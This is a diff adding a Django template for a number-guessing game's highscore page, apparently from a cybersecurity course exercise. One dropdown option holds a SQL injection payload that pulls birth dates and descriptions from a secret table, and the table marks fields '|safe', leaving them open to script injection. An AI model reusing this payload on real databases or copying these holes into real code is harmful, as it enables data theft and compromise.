@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <title>Guess the number-game!</title>
+    <link
+      href="https://fonts.googleapis.com/css?family=Press+Start+2P"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" type="text/css" href="/static/css/style.css" />
+  </head>
+  <body>
+    <p>You got {{points}} points</p>
+    <label for="scoresLength">Choose highscores length:</label>
+
+    <form method="post">
+      {% csrf_token %}
+      <select name="scoresLength" id="scoresLength">
+        <option value="1">1</option>
+        <option value="5">5</option>
+        <option value="10">10</option>
+        <option
+          value="2') UNION SELECT * FROM (SELECT id, dateOfBirth AS date, id AS player, description AS score FROM cybersecuritybase_secretassassin); --"
+        >
+          Inject!
+        </option>
+      </select>
+      <input type="submit" value="Update!" />
+    </form>
+
+    <h1>Highscores:</h1>
+    <table>
+      <thead>
+        <tr>
+          <th>Points</th>
+          <th>Name</th>
+          <th>Date</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for score in highscores %}
+        <tr>
+          <td>{{ score.score|safe }}</td>
+          <td>{{ score.player|safe }}</td>
+          <td>{{ score.date|safe }}</td>
+          {% endfor %}
+        </tr>
+      </tbody>
+    </table>
+
+    <p>
+      <a href="/"><span class="blink">Back to start</span></a>
+    </p>
+  </body>
+</html>
